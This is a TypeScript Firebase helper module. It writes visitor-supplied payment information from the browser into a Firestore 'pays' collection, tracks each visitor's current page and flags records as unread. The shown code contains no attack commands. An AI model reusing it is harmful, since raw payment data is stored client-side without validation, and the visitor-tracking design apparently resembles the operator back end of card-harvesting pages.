import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY ?? "",
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN ?? "",
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID ?? "",
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET ?? "",
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID ?? "",
  appId: import.meta.env.VITE_FIREBASE_APP_ID ?? "",
  databaseURL: import.meta.env.VITE_FIREBASE_DATABASE_URL ?? "",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

type FirebasePayData = {
  id?: string | null;
  [key: string]: unknown;
};

export async function getData(id: string) {
  try {
    const { getDoc, doc: firestoreDoc } = await import("firebase/firestore");
    const docRef = firestoreDoc(db, "pays", id);
    const docSnap = await getDoc(docRef);

    if (docSnap.exists()) {
      return docSnap.data();
    }
    return null;
  } catch (error) {
    console.error("Error getting document: ", error);
    return null;
  }
}

/**
 * @deprecated This function is no longer used. Use addToHistory from history-utils instead.
 * This function pollutes history with full page data instead of specific entries.
 */
export async function saveToHistory(_visitorID: string, _step: number) {
  console.warn("saveToHistory is deprecated and should not be used");
  return;
}

export async function addData(data: FirebasePayData) {
  if (!data.id) {
    throw new Error("Missing visitor/payment ID for Firebase write.");
  }

  if (typeof window !== "undefined") {
    window.localStorage.setItem("visitor", data.id);
  }

  try {
    const docRef = doc(db, "pays", data.id);
    await setDoc(
      docRef,
      {
        ...data,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        isUnread: true,
      },
      { merge: true }
    );
  } catch (error) {
    console.error("Error adding document: ", error);
    throw error;
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = typeof window !== "undefined"
    ? window.localStorage.getItem("visitor")
    : null;

  if (!visitorId) {
    return;
  }

  void addData({ id: visitorId, currentPage: page });
};

export const handlePay = async (
  paymentInfo: Record<string, unknown>,
  setPaymentInfo: (updater: (prev: Record<string, unknown>) => Record<string, unknown>) => void
) => {
  try {
    const visitorId = typeof window !== "undefined"
      ? window.localStorage.getItem("visitor")
      : null;

    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(docRef, { ...paymentInfo, status: "pending" }, { merge: true });
      setPaymentInfo((prev) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    if (typeof window !== "undefined") {
      window.alert("Error adding payment info to Firestore");
    }
  }
};

export { db, database, setDoc, doc };
